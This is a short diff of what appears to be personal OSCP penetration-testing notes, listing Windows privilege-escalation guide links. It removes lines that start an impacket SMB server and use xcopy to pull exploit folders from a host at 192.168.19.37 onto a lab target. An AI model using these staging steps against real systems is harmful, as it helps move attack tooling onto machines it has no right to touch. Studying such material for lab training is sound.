@@ -82,9 +82,3 @@ https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
 Checklist <https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md>
 
 
-for i in $(cat text);do cp -r $i /mnt/hgfs/OSCP/testexam/10.11.1.49/exploit/smb ;done;
-cd folder
-impacket-smbserver exp .
-xcopy \\192.168.19.37\exp\smb tester\smb /i /s
-xcopy \\192.168.19.37\exp\cve tester\cve /i /s
-
